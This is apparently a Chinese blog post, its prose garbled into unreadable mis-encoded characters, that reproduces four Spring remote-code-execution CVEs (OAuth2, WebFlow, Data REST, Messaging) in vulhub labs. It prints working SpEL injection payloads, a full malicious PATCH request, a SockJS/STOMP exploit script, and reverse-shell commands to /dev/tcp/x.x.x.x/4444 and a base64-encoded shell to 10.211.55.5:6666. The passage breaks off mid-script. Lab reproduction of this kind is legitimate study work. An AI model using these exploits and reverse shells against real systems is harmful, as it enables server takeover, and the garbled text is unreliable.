        <content type="html"><![CDATA[<h1 id="ã€æ¼æ´å¤ç°ã€‘Spring-ç³»åˆ—æ¼æ´å¤ç°ï¼ˆå…¨æ¼æ´ç‰ˆæœ¬ï¼‰"><a href="#ã€æ¼æ´å¤ç°ã€‘Spring-ç³»åˆ—æ¼æ´å¤ç°ï¼ˆå…¨æ¼æ´ç‰ˆæœ¬ï¼‰" class="headerlink" title="ã€æ¼æ´å¤ç°ã€‘Spring ç³»åˆ—æ¼æ´å¤ç°ï¼ˆå…¨æ¼æ´ç‰ˆæœ¬ï¼‰"></a>ã€æ¼æ´å¤ç°ã€‘Spring ç³»åˆ—æ¼æ´å¤ç°ï¼ˆå…¨æ¼æ´ç‰ˆæœ¬ï¼‰</h1><h2 id="é›¶ã€Spring-æ¡†æ¶ç®€ä»‹"><a href="#é›¶ã€Spring-æ¡†æ¶ç®€ä»‹" class="headerlink" title="é›¶ã€Spring æ¡†æ¶ç®€ä»‹"></a>é›¶ã€Spring æ¡†æ¶ç®€ä»‹</h2><p>Spring æ˜¯ä¸€ä¸ªå¼€æºçš„Java å¹³å°ï¼Œç”¨äºä¼ä¸šçº§Java åº”ç”¨å¼€å‘ã€‚Spring æ¡†æ¶å› å…¶çµæ´»æ€§ã€æ˜“ç”¨æ€§å’Œå¼ºå¤§çš„ç¤¾åŒºæ”¯æŒè€Œå¹¿å—å¥½è¯„ï¼Œæ˜¯æ„å»ºä¼ä¸šçº§Java åº”ç”¨çš„é¦–é€‰æ¡†æ¶ä¹‹ä¸€ã€‚</p><h2 id="ä¸€ã€Spring-Security-OAuth2-è¿œç¨‹ä»£ç æ‰§è¡ŒRCEæ¼æ´ï¼ˆCVE-2016-4977ï¼‰"><a href="#ä¸€ã€Spring-Security-OAuth2-è¿œç¨‹ä»£ç æ‰§è¡ŒRCEæ¼æ´ï¼ˆCVE-2016-4977ï¼‰" class="headerlink" title="ä¸€ã€Spring Security OAuth2 è¿œç¨‹ä»£ç æ‰§è¡ŒRCEæ¼æ´ï¼ˆCVE-2016-4977ï¼‰"></a>ä¸€ã€Spring Security OAuth2 è¿œç¨‹ä»£ç æ‰§è¡ŒRCEæ¼æ´ï¼ˆCVE-2016-4977ï¼‰</h2><h3 id="1ã€æ¼æ´åŸå› "><a href="#1ã€æ¼æ´åŸå› " class="headerlink" title="1ã€æ¼æ´åŸå› "></a>1ã€æ¼æ´åŸå› </h3><p>Spring Security OAuth2 æ˜¯Springæ¡†æ¶ä¸­æä¾›å®‰å…¨è®¤è¯æ”¯æŒçš„ä¸€ä¸ªæ¨¡å—ã€‚åœ¨å¤„ç†è¯·æ±‚è¿‡ç¨‹ä¸­å¦‚æœä½¿ç”¨äº†whitelabelè§†å›¾ï¼Œresponse_typeå‚æ•°å€¼ä¼šè¢«å½“åšSpring SpELæ¥æ‰§è¡Œï¼Œè¿›è€Œé€ æˆSpELæ³¨å…¥ã€‚æ”»å‡»è€…é€šè¿‡æ„é€ <code>response_type</code>å€¼å¯ä»¥è§¦å‘è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚</p><h3 id="2ã€å½±å“ç‰ˆæœ¬"><a href="#2ã€å½±å“ç‰ˆæœ¬" class="headerlink" title="2ã€å½±å“ç‰ˆæœ¬"></a>2ã€å½±å“ç‰ˆæœ¬</h3><ul><li>Spring Security OAuth 2.0åˆ°2.0.14</li><li>Spring Security OAuth 2.1åˆ°2.1.1</li><li>Spring Security OAuth 2.2åˆ°2.2.1</li><li>Spring Security OAuth 2.3åˆ°2.3.2</li></ul><h3 id="3ã€æ¼æ´å¤ç°"><a href="#3ã€æ¼æ´å¤ç°" class="headerlink" title="3ã€æ¼æ´å¤ç°"></a>3ã€æ¼æ´å¤ç°</h3><p>1ã€é¶åœºé¦–é¡µ</p><p><img src="/img/VulnRep-Spring/image-20240521173035003.png" alt="image-20240521173035003"></p><p>2ã€è®¿é—®<code>/oauth/authorized</code></p><p>é»˜è®¤è´¦å·å¯†ç ï¼š<code>admin:admin</code></p><p><img src="/img/VulnRep-Spring/image-20240521174542972.png" alt="image-20240521174542972"></p><p>3ã€æ·»åŠ è¯·æ±‚å‚æ•°response_type</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/oauth/authorize?response_type=$&#123;2*3&#125;&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Spring/image-20240521174848661.png" alt="image-20240521174848661"></p><p>4ã€ä¸ŠPOC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">message = input(&#x27;Enter message to encode:&#x27;)</span><br><span class="line">poc = &#x27;$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&#x27; % ord(message[0])</span><br><span class="line">for ch in message[1:]:</span><br><span class="line">   poc += &#x27;.concat(T(java.lang.Character).toString(%s))&#x27; % ord(ch) </span><br><span class="line"></span><br><span class="line">poc += &#x27;)&#125;&#x27;</span><br><span class="line">print(poc)</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Spring/image-20240521175616193.png" alt="image-20240521175616193"></p><h2 id="äºŒã€Spring-WebFlow-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-4971ï¼‰"><a href="#äºŒã€Spring-WebFlow-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-4971ï¼‰" class="headerlink" title="äºŒã€Spring WebFlow è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-4971ï¼‰"></a>äºŒã€Spring WebFlow è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-4971ï¼‰</h2><h3 id="1ã€æ¼æ´åŸå› -1"><a href="#1ã€æ¼æ´åŸå› -1" class="headerlink" title="1ã€æ¼æ´åŸå› "></a>1ã€æ¼æ´åŸå› </h3><p>Spring WebFlow æ˜¯ä¸€ä¸ªé€‚ç”¨äºå¼€å‘åŸºäºæµç¨‹çš„åº”ç”¨ç¨‹åºçš„æ¡†æ¶ï¼ˆå¦‚è´­ç‰©é€»è¾‘ï¼‰ï¼Œå¯ä»¥å°†æµç¨‹çš„å®šä¹‰å’Œå®ç°æµç¨‹è¡Œä¸ºçš„ç±»å’Œè§†å›¾åˆ†ç¦»å¼€æ¥ã€‚åœ¨å…¶ 2.4.x ç‰ˆæœ¬ä¸­ï¼Œå¦‚æœæˆ‘ä»¬æ§åˆ¶äº†æ•°æ®ç»‘å®šæ—¶çš„fieldï¼Œå°†å¯¼è‡´ä¸€ä¸ªSpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ï¼Œæœ€ç»ˆé€ æˆä»»æ„å‘½ä»¤æ‰§è¡Œã€‚</p><p>åœ¨è®¢é˜…é…’åº—åŠŸèƒ½å¤„ï¼Œå­˜åœ¨ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œï¼Œç›´æ¥è°ƒç”¨äº†ä¸¤ä¸ªå‡½æ•°ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°ï¼Œä¸€ä¸ªæ˜¯ï¼šaddDefaultMappings ,ä¸€ä¸ªæ˜¯ addModelBindingsã€‚å…¶ä¸­ï¼Œç›´æ¥æ§åˆ¶fieldè¿™ä¸ªå€¼çš„å‡½æ•°æ˜¯addDefaultMappingsï¼Œä¸”æœªåšè¿‡æ»¤ï¼Œè€ŒaddModelBindingsæ˜¯ç›´æ¥è·å–çš„javaçš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œç”±é…ç½®æ–‡ä»¶æ¥ç¡®å®šæ˜¯å¦æœ‰ binder èŠ‚ç‚¹ï¼Œå¦‚æœæœ‰ï¼Œå°±æ— æ³•è§¦å‘ä»£ç æ‰§è¡Œã€‚</p><p>æ‰€ä»¥æ¼æ´æ¡ä»¶æœ‰ä¸¤ä¸ªï¼š</p><ol><li>binderèŠ‚ç‚¹ä¸ºç©ºï¼›</li><li>useSpringBeanBinding é»˜è®¤å€¼ï¼ˆfalseï¼‰æœªä¿®æ”¹ã€‚</li></ol><h3 id="2ã€å½±å“ç‰ˆæœ¬-1"><a href="#2ã€å½±å“ç‰ˆæœ¬-1" class="headerlink" title="2ã€å½±å“ç‰ˆæœ¬"></a>2ã€å½±å“ç‰ˆæœ¬</h3><p>Spring WebFlow 2.4.0 - 2.4.4</p><h3 id="3ã€æ¼æ´å¤ç°-1"><a href="#3ã€æ¼æ´å¤ç°-1" class="headerlink" title="3ã€æ¼æ´å¤ç°"></a>3ã€æ¼æ´å¤ç°</h3><p>1ã€é¦–é¡µ</p><p><img src="/img/VulnRep-Spring/image-20240522134021757.png" alt="image-20240522134021757"></p><p>2ã€ç‚¹å‡»å·¦ä¸Šè§’è¿›è¡Œç™»é™†</p><p>ç”¨ç»™çš„è´¦å·å¯†ç è¿›è¡Œç™»é™†</p><p><img src="/img/VulnRep-Spring/image-20240522134136178.png" alt="image-20240522134136178"></p><p>3ã€è®¿é—®<code>hotels/1</code> çš„é…’åº—</p><p><img src="/img/VulnRep-Spring/image-20240522134433756.png" alt="image-20240522134433756"></p><p><img src="/img/VulnRep-Spring/image-20240522134552636.png" alt="image-20240522134552636"></p><p>æŠ“åŒ…<code>Confirm</code>çš„POSTè¯·æ±‚ã€‚ç”±äºæ˜¯å­˜åœ¨token çš„ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨é‡æ”¾æ˜¯æ— æ³•å¤ç°çš„ï¼Œéœ€è¦ç°æŠ“æ”¹åŒ…</p><p><img src="/img/VulnRep-Spring/image-20240522134638988.png" alt="image-20240522134638988"></p><p>4ã€ä¸ŠPOC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//1ã€åˆ›å»ºæ–‡ä»¶</span><br><span class="line">&amp;_(new+java.lang.ProcessBuilder(&quot;touch&quot;,&quot;/tmp/1.txt&quot;)).start()=vulhub</span><br><span class="line"></span><br><span class="line">//2ã€åå¼¹shell</span><br><span class="line">&amp;_(new+java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash+-i+&gt;%26+/dev/tcp/x.x.x.x/4444+0&gt;%261&quot;)).start()=vulhub</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Spring/image-20240522135429106.png" alt="image-20240522135429106"></p><p>è¿›å®¹å™¨æŸ¥çœ‹</p><p><img src="/img/VulnRep-Spring/image-20240522135555083.png" alt="image-20240522135555083"></p><h2 id="ä¸‰ã€Spring-Data-Rest-è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-8046ï¼‰"><a href="#ä¸‰ã€Spring-Data-Rest-è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-8046ï¼‰" class="headerlink" title="ä¸‰ã€Spring Data Rest è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-8046ï¼‰"></a>ä¸‰ã€Spring Data Rest è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-8046ï¼‰</h2><h3 id="1ã€æ¼æ´åŸå› -2"><a href="#1ã€æ¼æ´åŸå› -2" class="headerlink" title="1ã€æ¼æ´åŸå› "></a>1ã€æ¼æ´åŸå› </h3><p>Spring Data REST æœåŠ¡å™¨åœ¨å¤„ç† PATCH è¯·æ±‚æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„ JSON æ ¼å¼çš„ PATCH è¯·æ±‚å¹¶å‘é€ç»™spring-date-rest æœåŠ¡å™¨ï¼Œæ¥æ‰§è¡Œæ¶æ„çš„Javaä»£ç ã€‚</p><h3 id="2ã€å½±å“ç‰ˆæœ¬-2"><a href="#2ã€å½±å“ç‰ˆæœ¬-2" class="headerlink" title="2ã€å½±å“ç‰ˆæœ¬"></a>2ã€å½±å“ç‰ˆæœ¬</h3><ul><li>Spring Data REST ç‰ˆæœ¬ &lt; 2.5.12ã€ 2.6.7ã€ 3.0 RC3</li><li>Spring Boot ç‰ˆæœ¬ &lt; 2.0.0M4</li><li>Spring Data release trains Kay-RC3 ä¹‹å‰çš„ç‰ˆæœ¬</li></ul><h3 id="3ã€æ¼æ´å¤ç°-2"><a href="#3ã€æ¼æ´å¤ç°-2" class="headerlink" title="3ã€æ¼æ´å¤ç°"></a>3ã€æ¼æ´å¤ç°</h3><p>1ã€é¦–é¡µ</p><p><img src="/img/VulnRep-Spring/image-20240522142110867.png" alt="image-20240522142110867"></p><p>2ã€æ¼æ´ç‚¹åœ¨<code>/customers/1</code></p><p><img src="/img/VulnRep-Spring/image-20240522142308657.png" alt="image-20240522142308657"></p><p>3ã€æŠ“åŒ…ä¸ŠPOC</p><p>éœ€è¦æŠŠè¦æ‰§è¡Œçš„å‘½ä»¤è½¬æˆASCIIï¼Œè¿™é‡Œå€ŸåŠ©pythonè„šæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Payload to ASCII</span><br><span class="line">payload = b&#x27;touch /tmp/shell.txt&#x27;</span><br><span class="line">bytecode = &#x27;,&#x27;.join(str(i) for i in list(payload))</span><br><span class="line">print(bytecode)</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹æ•°æ®åŒ…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PATCH /customers/1 HTTP/1.1</span><br><span class="line">Host: xxx.xxx.xxx.xxx:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">If-None-Match: &quot;0&quot;</span><br><span class="line">If-Modified-Since: Wed, 22 May 2024 06:13:21 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json-patch+json</span><br><span class="line">Content-Length: 209</span><br><span class="line"></span><br><span class="line">[&#123; &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;116,111,117,99,104,32,47,116,109,112,47,115,104,101,108,108,46,116,120,116&#125;))/lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; &#125;]</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Spring/image-20240522143442157.png" alt="image-20240522143442157"></p><p>åå¼¹shell çš„POCï¼Œå¯è®²å‘½ä»¤æ›¿æ¢æˆå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMTEuNTUuNS82NjY2IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><h2 id="å››ã€Spring-Messaging-è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-1270ï¼‰"><a href="#å››ã€Spring-Messaging-è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-1270ï¼‰" class="headerlink" title="å››ã€Spring Messaging è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-1270ï¼‰"></a>å››ã€Spring Messaging è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-1270ï¼‰</h2><h3 id="1ã€æ¼æ´åŸå› -3"><a href="#1ã€æ¼æ´åŸå› -3" class="headerlink" title="1ã€æ¼æ´åŸå› "></a>1ã€æ¼æ´åŸå› </h3><p>spring messagingä¸ºspringæ¡†æ¶æä¾›æ¶ˆæ¯æ”¯æŒï¼Œå…¶ä¸Šå±‚åè®®æ˜¯STOMPï¼Œåº•å±‚é€šä¿¡åŸºäºSockJSï¼Œåœ¨spring messagingä¸­ï¼Œå…¶å…è®¸å®¢æˆ·ç«¯è®¢é˜…æ¶ˆæ¯ï¼Œå¹¶ä½¿ç”¨selectorè¿‡æ»¤æ¶ˆæ¯ã€‚selectorç”¨SpELè¡¨è¾¾å¼ç¼–å†™ï¼Œå¹¶ä½¿ç”¨<code>StandardEvaluationContext</code>è§£æï¼Œé€ æˆå‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p><h3 id="2ã€å½±å“ç‰ˆæœ¬-3"><a href="#2ã€å½±å“ç‰ˆæœ¬-3" class="headerlink" title="2ã€å½±å“ç‰ˆæœ¬"></a>2ã€å½±å“ç‰ˆæœ¬</h3><ul><li>Spring Framework 5.0 åˆ° 5.0.4 </li><li>Spring Framework 4.3 åˆ° 4.3.14</li></ul><h3 id="3ã€æ¼æ´å¤ç°-3"><a href="#3ã€æ¼æ´å¤ç°-3" class="headerlink" title="3ã€æ¼æ´å¤ç°"></a>3ã€æ¼æ´å¤ç°</h3><p>1ã€é¦–é¡µ</p><p><img src="/img/VulnRep-Spring/image-20240523155822790.png" alt="image-20240523155822790"></p><p>2ã€ä¸Šexp</p><p>åˆ›å»º<code>/tmp/1.txt</code>æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line">import logging</span><br><span class="line">import sys</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">logging.basicConfig(stream=sys.stdout, level=logging.INFO)</span><br><span class="line"></span><br><span class="line">def random_str(length):</span><br><span class="line">    letters = string.ascii_lowercase + string.digits</span><br><span class="line">    return &#x27;&#x27;.join(random.choice(letters) for c in range(length))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class SockJS(threading.Thread):</span><br><span class="line">    def __init__(self, url, *args, **kwargs):</span><br><span class="line">        super().__init__(*args, **kwargs)</span><br><span class="line">        self.base = f&#x27;&#123;url&#125;/&#123;random.randint(0, 1000)&#125;/&#123;random_str(8)&#125;&#x27;</span><br><span class="line">        self.daemon = True</span><br><span class="line">        self.session = requests.session()</span><br><span class="line">        self.session.headers = &#123;</span><br><span class="line">            &#x27;Referer&#x27;: url,</span><br><span class="line">            &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">        self.t = int(time.time()*1000)</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        url = f&#x27;&#123;self.base&#125;/htmlfile?c=_jp.vulhub&#x27;</span><br><span class="line">        response = self.session.get(url, stream=True)</span><br><span class="line">        for line in response.iter_lines():</span><br><span class="line">            time.sleep(0.5)</span><br><span class="line">    </span><br><span class="line">    def send(self, command, headers, body=&#x27;&#x27;):</span><br><span class="line">        data = [command.upper(), &#x27;\n&#x27;]</span><br><span class="line"></span><br><span class="line">        data.append(&#x27;\n&#x27;.join([f&#x27;&#123;k&#125;:&#123;v&#125;&#x27; for k, v in headers.items()]))</span><br><span class="line">        </span><br><span class="line">        data.append(&#x27;\n\n&#x27;)</span><br><span class="line">        data.append(body)</span><br><span class="line">        data.append(&#x27;\x00&#x27;)</span><br><span class="line">        data = json.dumps([&#x27;&#x27;.join(data)])</span><br><span class="line"></span><br><span class="line">        response = self.session.post(f&#x27;&#123;self.base&#125;/xhr_send?t=&#123;self.t&#125;&#x27;, data=data)</span><br><span class="line">        if response.status_code != 204:</span><br><span class="line">            logging.info(f&quot;send &#x27;&#123;command&#125;&#x27; data error.&quot;)</span><br><span class="line">        else:</span><br><span class="line">            logging.info(f&quot;send &#x27;&#123;command&#125;&#x27; data success.&quot;)</span><br><span class="line"></span><br><span class="line">    def __del__(self):</span><br><span class="line">        self.session.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sockjs = SockJS(&#x27;http://your-ip:8080/gs-guide-websocket&#x27;)</span><br><span class="line">sockjs.start()</span><br><span class="line">time.sleep(1)</span><br><span class="line"></span><br><span class="line">sockjs.send(&#x27;connect&#x27;, &#123;</span><br><span class="line">    &#x27;accept-version&#x27;: &#x27;1.1,1.0&#x27;,</span><br><span class="line">    &#x27;heart-beat&#x27;: &#x27;10000,10000&#x27;</span><br><span class="line">&#125;)</span><br><span class="line">sockjs.send(&#x27;subscribe&#x27;, &#123;</span><br><span class="line">    &#x27;selector&#x27;: &quot;T(java.lang.Runtime).getRuntime().exec(&#x27;touch /tmp/1.txt&#x27;)&quot;,</span><br><span class="line">    &#x27;id&#x27;: &#x27;sub-0&#x27;,</span><br><span class="line">    &#x27;destination&#x27;: &#x27;/topic/greetings&#x27;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">data = json.dumps(&#123;&#x27;name&#x27;: &#x27;vulhub&#x27;&#125;)</span><br><span class="line">sockjs.send(&#x27;send&#x27;, &#123;</span><br><span class="line">    &#x27;content-length&#x27;: len(data),</span><br><span class="line">    &#x27;destination&#x27;: &#x27;/app/hello&#x27;</span><br><span class="line">&#125;, data)</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Spring/image-20240523160413486.png" alt="image-20240523160413486"></p><p>åå¼¹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">from asyncio.constants import LOG_THRESHOLD_FOR_CONNLOST_WRITES</span><br><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line">import logging</span><br><span class="line">import sys</span><br><span class="line">import json</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">logging.basicConfig(stream=sys.stdout, level=logging.INFO)</span><br><span class="line"></span><br><span class="line">def random_str(length):</span><br><span class="line">    letters = string.ascii_lowercase + string.digits</span><br><span class="line">    return &#x27;&#x27;.join(random.choice(letters) for c in range(length))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class SockJS(threading.Thread):</span><br><span class="line">    def __init__(self, url, *args, **kwargs):</span><br><span class="line">        super().__init__(*args, **kwargs)</span><br><span class="line">        self.base = f&#x27;&#123;url&#125;/&#123;random.randint(0, 1000)&#125;/&#123;random_str(8)&#125;&#x27;</span><br><span class="line">        self.daemon = True</span><br><span class="line">        self.session = requests.session()</span><br><span class="line">        self.session.headers = &#123;</span><br><span class="line">            &#x27;Referer&#x27;: url,</span><br><span class="line">            &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">        self.t = int(time.time()*1000)</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        url = f&#x27;&#123;self.base&#125;/htmlfile?c=_jp.vulhub&#x27;</span><br><span class="line">        response = self.session.get(url, stream=True)</span><br><span class="line">        for line in response.iter_lines():</span><br><span class="line">            time.sleep(0.5)</span><br><span class="line">    </span><br><span class="line">    def send(self, command, headers, body=&#x27;&#x27;):</span><br><span class="line">        data = [command.upper(), &#x27;\n&#x27;]</span><br><span class="line"></span><br><span class="line">        data.append(&#x27;\n&#x27;.join([f&#x27;&#123;k&#125;:&#123;v&#125;&#x27; for k, v in headers.items()]))</span><br><span class="line">        </span><br><span class="line">        data.append(&#x27;\n\n&#x27;)</span><br><span class="line">        data.append(body)</span><br><span class="line">        data.append(&#x27;\x00&#x27;)</span><br><span class="line">        data = json.dumps([&#x27;&#x27;.join(data)])</span><br><span class="line"></span><br><span class="line">        response = self.session.post(f&#x27;&#123;self.base&#125;/xhr_send?t=&#123;self.t&#125;&#x27;, data=data)</span><br><span class="line">        if response.status_code != 204:</span><br><span class="line">            logging.info(f&quot;send &#x27;&#123;command&#125;&#x27; data error.&quot;)</span><br><span class="line">        else:</span><br><span class="line">            logging.info(f&quot;send &#x27;&#123;command&#125;&#x27; data success.&quot;)</span><br><span class="line"></span><br><span class="line">    def __del__(self):</span><br><span class="line">        self.session.close()</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    sockjs = SockJS(url)</span><br><span class="line">    sockjs.start()</span><br><span class="line">    time.sleep(1)</span><br><span class="line"></span><br><span class="line">    sockjs.send(&#x27;connect&#x27;, &#123;</span><br><span class="line">        &#x27;accept-version&#x27;: &#x27;1.1,1.0&#x27;,</span><br><span class="line">        &#x27;heart-beat&#x27;: &#x27;10000,10000&#x27;</span><br><span class="line">    &#125;)</span><br><span class="line">    sockjs.send(&#x27;subscribe&#x27;, &#123;</span><br><span class="line">        &#x27;selector&#x27;: &quot;T(java.lang.Runtime).getRuntime().exec(&#x27;bash -c &#123;echo,&quot; + command.decode(&#x27;utf-8&#x27;) + &quot;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)&quot;,</span><br><span class="line">        &#x27;id&#x27;: &#x27;sub-0&#x27;,</span><br><span class="line">        